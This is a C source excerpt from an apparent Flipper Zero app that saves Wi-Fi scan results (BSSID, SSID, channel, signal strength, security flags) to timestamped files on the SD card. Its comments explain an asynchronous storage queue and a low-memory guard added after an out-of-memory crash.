// Persist the SCAN RESULTS to the SD (not an action log). One timestamped file per
// scan under /ext/petrel/scans/ (e.g. 2026-10-15_13-40-12_wifis.txt) with a small header, so
// every Wi-Fi/PMF/STA/BLE result survives a reboot and can be reviewed later.
static void petrel_save_scan(const char* kind, const char* body) {
    if(!kind) return;
    if(!set_save) return;   // E4: "Save results" off -> nothing is written
    char name[48];
    snprintf(name, sizeof(name), "%s.txt", kind);
    char path[160];
    petrel_artifact_path(path, sizeof(path), name);   // same helper the other artifacts use
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    char hdr[96];
    int n = snprintf(
        hdr,
        sizeof(hdr),
        "# %04d-%02d-%02d %02d:%02d:%02d  %s\n",
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second,
        kind);
    // Serialise the whole record and hand it to the storage worker. This used to be a synchronous
    // write from the GUI thread, from inside the UART line handler.
    size_t blen = (body && body[0]) ? strlen(body) : 0;
    size_t total = (size_t)n + blen;
    diag(14, (uint32_t)total, 1);                    // scan-list snapshot requested
    char* snap = malloc(total);
    if(snap) {
        memcpy(snap, hdr, (size_t)n);
        if(blen) memcpy(snap + n, body, blen);
        if(!storage_submit(path, snap, total, false)) free(snap);   // queue full -> drop, no block
    }
}

// Build "BSSID|SSID|ch|rssi|security" lines for the whole scanned AP list and save it.
static void petrel_save_wifi_list(Petrel* app) {
    if(app->wifiCount <= 0) return;
    size_t cap = (size_t)app->wifiCount * 96u + 1u;
    // Heap guard (2026-10-28 hardware run): this path holds TWO buffers of ~cap at once - the body
    // here and the header+body copy inside petrel_save_scan(). With 48 APs that is ~9.2 KB, and it
    // lands exactly when the scan results finish arriving. With a flipctl RPC session holding ~18 KB
    // the Flipper OOM-crashed here and rebooted. Dropping the save keeps the results on screen.
    if(memmgr_heap_get_max_free_block() < cap + 512u) {
        diag(44, (uint32_t)cap, (uint32_t)memmgr_heap_get_max_free_block());
        STORAGE_STATUS("low memory: list not saved");
        storage_fail_seq++;
        return;
    }
    char* buf = malloc(cap);
    if(!buf) {
        diag(44, (uint32_t)cap, 0);   /* malloc failed despite the guard */
        return;
    }
    buf[0] = '\0';
    for(int i = 0; i < app->wifiCount; i++) {
        char line[112];
        snprintf(
            line,
            sizeof(line),
            "%s|%s|ch%d|%ddBm|0x%X\n",
            app->wifiList[i].APbssid,
            app->wifiList[i].APssid,
            app->wifiList[i].chanel,
            app->wifiList[i].rssi,
            app->wifiList[i].security);
        if(strlen(buf) + strlen(line) < cap) petrel_strcat(buf, line);
    }
    petrel_save_scan("wifis", buf);
    free(buf);
}
